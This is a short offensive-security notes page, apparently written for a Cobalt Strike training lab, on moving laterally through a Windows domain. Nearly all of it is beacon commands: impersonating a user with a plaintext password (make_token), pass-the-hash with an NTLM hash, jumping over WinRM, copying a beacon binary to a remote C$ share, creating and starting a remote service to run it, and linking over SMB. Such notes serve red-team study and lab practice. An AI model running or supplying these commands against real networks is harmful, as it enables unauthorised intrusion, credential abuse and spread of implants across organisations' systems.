# Techniques - Moving Laterally





## Introduction

This page section will combine impersonation techniques found in the previous section "User Impersionation" with the actual techniques to establish connections on other hosts.







## Cobalt Strike&#x20;

Below is a combination of different ways to get a beacon on the host using multiple different credential methods to impersonate a user.

### Plaintext Creds - make\_token

```bash
// Establish netonly Token (example)
beacon> make_token DEV\jking Qwerty123
// Example beacon spawn
// Jump (using SMB listener)
beacon> jump winrm64 sql-2.dev.cyberbotic.io Default_SMB_Listener
```



### Hash creds - pth

```bash
beacon> pth DEV\Administrator 59fc0f884922b4ce376051134c71e22c
// Example beacon spawn
beacon> upload demo.svc.exe C:\Windows\Temp
// Copy beacon to remote host & create service
beacon> shell copy C:\Windows\Temp\demo.svc.exe \\172.16.48.121\C$\Windows\Temp
beacon> shell sc \\172.16.48.121 create demopth binpath=C:\Windows\Temp\demo.svc.exe
beacon> shell sc \\172.16.48.121 start demopth
// Connect to beacon w/ link (smb)
beacon> link 172.16.48.83
// Drop impoersonation
beacon> rev2self
```

\
